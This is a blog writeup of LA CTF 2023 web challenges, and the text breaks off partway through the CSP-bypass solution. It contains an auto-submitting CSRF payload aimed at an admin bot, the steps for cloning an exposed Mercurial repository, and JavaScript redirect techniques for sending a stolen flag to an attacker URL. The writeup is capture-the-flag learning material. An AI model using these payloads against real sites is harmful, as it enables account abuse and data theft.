<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="LA CTF 2023 - Writeup" /><meta name="author" content="H0j3n" /><meta property="og:locale" content="en" /><meta name="description" content="This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event." /><meta property="og:description" content="This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event." /><link rel="canonical" href="https://h0j3n.github.io/posts/LACTF-2023-Writeup/" /><meta property="og:url" content="https://h0j3n.github.io/posts/LACTF-2023-Writeup/" /><meta property="og:site_name" content="$(H0j3n)" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-11T08:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="LA CTF 2023 - Writeup" /><meta name="twitter:site" content="@H0j3n" /><meta name="twitter:creator" content="@H0j3n" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H0j3n"},"dateModified":"2023-02-14T11:53:35+08:00","datePublished":"2023-02-11T08:00:00+08:00","description":"This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.","headline":"LA CTF 2023 - Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://h0j3n.github.io/posts/LACTF-2023-Writeup/"},"url":"https://h0j3n.github.io/posts/LACTF-2023-Writeup/"}</script><title>LA CTF 2023 - Writeup | $(H0j3n)</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="$(H0j3n)"><meta name="application-name" content="$(H0j3n)"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/51261763?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">$(H0j3n)</a></div><div class="site-subtitle font-italic">Knowledge sharing related to Cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/H0j3n" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/H0j3n" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>LA CTF 2023 - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>LA CTF 2023 - Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1676073600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 11, 2023 </em> </span> <span> Updated <em class="" data-ts="1676346815" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 14, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> H0j3n </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1698 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.</p><p>Link to archive challenges: <a href="https://github.com/uclaacm/lactf-archive/tree/master/2023">https://github.com/uclaacm/lactf-archive/tree/master/2023</a></p><h3 id="category--web"><span class="mr-2">Category : Web</span><a href="#category--web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="web--college-tour"><span class="mr-2">Web : College Tour</span><a href="#web--college-tour" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.</p><p>Link: <a href="https://college-tour.lac.tf">https://college-tour.lac.tf</a></p></blockquote><p>With a simple use of the curl command, collecting all six flags from the three files, <code class="language-plaintext highlighter-rouge">index.html</code>, <code class="language-plaintext highlighter-rouge">index.css</code>, and <code class="language-plaintext highlighter-rouge">script.js</code>, becomes effortless.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>└─# curl <span class="nt">-ks</span> https://college-tour.lac.tf/ | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">tr</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"lOsT|</span><span class="se">\!</span><span class="s2">N|number_text|03LT3r"</span> | <span class="nb">grep</span> <span class="nt">-i</span> lactf
lactf<span class="o">{</span>1_j03_4<span class="o">}</span><span class="nt">--</span><span class="o">&gt;</span>
lactf<span class="o">{</span>2_nd_j0<span class="o">}</span>
lactf<span class="o">{</span>4_n3_bR<span class="o">}</span>.pdf
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>└─# curl <span class="nt">-ks</span> https://college-tour.lac.tf/index.css | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">tr</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"lOsT|</span><span class="se">\!</span><span class="s2">N|number_text|03LT3r"</span> | <span class="nb">grep</span> <span class="nt">-i</span> lactf
lactf<span class="o">{</span>3_S3phI<span class="o">}</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>└─# curl <span class="nt">-ks</span> https://college-tour.lac.tf/script.js | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">tr</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"lOsT|</span><span class="se">\!</span><span class="s2">N|number_text|03LT3r"</span> | <span class="nb">grep</span> <span class="nt">-i</span> lactf
lactf<span class="o">{</span>6_AY_hi<span class="o">}</span>
<span class="nv">cookie</span><span class="o">=</span>lactf<span class="o">{</span>5_U1n_s<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}</code></p><h4 id="web--metaverse"><span class="mr-2">Web : Metaverse</span><a href="#web--metaverse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.</p><p>Link: <a href="https://metaverse.lac.tf">https://metaverse.lac.tf</a></p><p>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p></blockquote><p><strong>Source Code (index.js)</strong> : <a href="https://raw.githubusercontent.com/uclaacm/lactf-archive/main/2023/web/metaverse/index.js">index.js</a></p><p>This code defines a simple web application using the Express framework in Node.js. The application allows users to register and log in, post updates, and view other users’ posts.</p><p>The code sets up the following routes:</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/post/:id</code>: This route displays the content of a post with the given ID.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/</code>: This route requires the user to be logged in and serves static HTML content.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/login</code>: This route serves static HTML content for the login page.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/register</code>: This route handles the user registration process.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/login</code>: This route handles the user login process.</p></div></blockquote><p>We can easily register an account and login.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web7.png" alt="" data-proofer-ignore></p><p>Looking at the source code, the flag is located in <code class="language-plaintext highlighter-rouge">displayname</code> of the admin account.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nx">accounts</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">password</span><span class="p">:</span> <span class="nx">adminpw</span><span class="p">,</span>
    <span class="na">displayName</span><span class="p">:</span> <span class="nx">flag</span><span class="p">,</span>
    <span class="na">posts</span><span class="p">:</span> <span class="p">[],</span>
    <span class="na">friends</span><span class="p">:</span> <span class="p">[],</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Also, the display name will be available at home page if they also add our <code class="language-plaintext highlighter-rouge">username</code> as a friend. Since, we can create anything for the admin to access via <code class="language-plaintext highlighter-rouge">https://admin-bot.lac.tf/metaverse</code>. Let’s create a CSRF payload to send to admin to add our username as a friend.</p><p>Payload CSRF:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://metaverse.lac.tf/friend"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"admin123"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
 <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web1.png" alt="" data-proofer-ignore></p><p>Flag : <code class="language-plaintext highlighter-rouge">lactf{please_metaget_me_out_of_here}</code></p><h4 id="web--my-chemical-romance"><span class="mr-2">Web : my-chemical-romance</span><a href="#web--my-chemical-romance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>When I was… a young boy… I made a “My Chemical Romance” fanpage!</p><p>Link: <a href="https://my-chemical-romance.lac.tf">https://my-chemical-romance.lac.tf</a></p></blockquote><p>Inside the response, we can see it stated “Mercurial-SCM”.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web2.png" alt="" data-proofer-ignore></p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">Mercurial</code>: is a free, distributed version control system (VCS) that provides fast and efficient handling of source code and other development files. It is commonly known as Mercurial-SCM, where “SCM” stands for “Source Code Management.” Mercurial enables developers to keep track of changes to their code, collaborate with others, and maintain multiple versions of their codebase</p></div></blockquote><p>Let’s first install <code class="language-plaintext highlighter-rouge">mercurial (hg)</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo apt-get install mercurial
</pre></table></code></div></div><p>We can easily <code class="language-plaintext highlighter-rouge">clone</code> a repository using <code class="language-plaintext highlighter-rouge">hg</code> command.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hg clone https://my-chemical-romance.lac.tf/ dump
</pre></table></code></div></div><p>When we see the log using <code class="language-plaintext highlighter-rouge">hg log -v</code>, we can see changeset <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">1</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>changeset:   1:3ecb3a79e255
tag:         tip
user:        bliutech &lt;bensonhliu@gmail.com&gt;
date:        Fri Feb 10 06:50:48 2023 -0800
files:       gerard_way2001.py static/index.html
description:
Decided to keep my favorite song a secret :D


changeset:   0:2445227b04cd
user:        bliutech &lt;bensonhliu@gmail.com&gt;
date:        Fri Feb 10 06:49:48 2023 -0800
files:       gerard_way2001.py static/404.html static/index.css static/index.html static/mcr-meme.jpeg static/my-chemical-romance.jpeg
description:
I love 'My Chemical Romance'
</pre></table></code></div></div><p>To check our current changeset, we can use <code class="language-plaintext highlighter-rouge">hg heads</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>changeset:   1:3ecb3a79e255
tag:         tip
user:        bliutech &lt;bensonhliu@gmail.com&gt;
date:        Fri Feb 10 06:50:48 2023 -0800
summary:     Decided to keep my favorite song a secret :D
</pre></table></code></div></div><p>To change to <code class="language-plaintext highlighter-rouge">0</code> we can use <code class="language-plaintext highlighter-rouge">hg update -r 0</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre># hg update -r 0
2 files updated, 0 files merged, 0 files removed, 0 files unresolved
</pre></table></code></div></div><p>Flag can be found inside the updated <code class="language-plaintext highlighter-rouge">gerard_way2001.py</code></p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web3.png" alt="" data-proofer-ignore></p><p>Flag : <code class="language-plaintext highlighter-rouge">lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}</code></p><h4 id="web--california-state-police"><span class="mr-2">Web : california-state-police</span><a href="#web--california-state-police" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>Stop! You’re under arrest for making suggestive 3 letter acronyms!</p><p>Link: <a href="https://california-state-police.lac.tf">https://california-state-police.lac.tf</a></p><p>Admin Bot (<a href="https://admin-bot.lac.tf/california-state-police">https://admin-bot.lac.tf/california-state-police</a>) (note: the adminpw cookie is HttpOnly and SameSite=Lax)</p></blockquote><p><strong>Source Code (index.js)</strong> : <a href="https://raw.githubusercontent.com/uclaacm/lactf-archive/main/2023/web/california-state-police/index.js">index.js</a></p><p>One thing we know, this challenge related to CSP and how we can bypass it. The current CSP can be found either in the source code or in the response header.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>default-src 'none'; script-src 'unsafe-inline'
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web4.png" alt="" data-proofer-ignore></p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">default-src 'none'</code>: All types of content (scripts, images, stylesheets, etc.) are blocked from being loaded. This is a strict policy that provides a high level of security, as it prevents any malicious content from being loaded onto the page.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">script-src 'unsafe-inline'</code>: Inline JavaScript is allowed to be executed on the page. Inline JavaScript refers to JavaScript code that is directly included in the HTML, rather than being loaded from an external file</p></div></blockquote><p>Everytime we request something with <code class="language-plaintext highlighter-rouge">self</code> or <code class="language-plaintext highlighter-rouge">external</code> , we will get this error.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://california-state-police.lac.tf/report/903dfa2d-4bfe-4a00-8a08-fe0566008807</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web5.png" alt="" data-proofer-ignore></p><p>But, it’s possible redirect to another website. Below are the successful <code class="language-plaintext highlighter-rouge">javascripts</code> we can use.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://URL</span><span class="dl">"</span><span class="p">)</span> <span class="o">----&gt;</span> <span class="nx">open</span> <span class="k">in</span> <span class="k">new</span> <span class="nx">tab</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://URL</span><span class="dl">"</span> <span class="o">----&gt;</span> <span class="nx">open</span> <span class="k">in</span> <span class="nx">current</span> <span class="nx">tab</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://URL</span><span class="dl">"</span><span class="p">)</span> <span class="o">----&gt;</span> <span class="nx">open</span> <span class="k">in</span> <span class="nx">current</span> <span class="nx">tab</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://URL</span><span class="dl">"</span><span class="p">)</span> <span class="o">----&gt;</span> <span class="nx">open</span> <span class="k">in</span> <span class="nx">current</span> <span class="nx">tab</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://URL</span><span class="dl">"</span> <span class="o">----&gt;</span> <span class="nx">open</span> <span class="k">in</span> <span class="nx">current</span> <span class="nx">tab</span>
</pre></table></code></div></div><p>We going to use 2 files</p><ol><li>Stored an HTML that will have a form with post method and retrieve the flag<li>Stored a javascript that will get the value of the flag in file <code class="language-plaintext highlighter-rouge">1</code> and send/redirect it to the attacker URL.</ol><p><strong>FILE 1</strong></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60 --&gt;</span>

<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"flag-form"</span> <span class="na">action=</span><span class="s">"/flag"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Click Me<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag-form</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><strong>FILE 2</strong></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c">&lt;!--</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//california-state-police.lac.tf/report/27fadbd1-a53e-4cb0-b102-40e60d049a59 --&gt;</span>

<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nx">redirect</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">webs</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
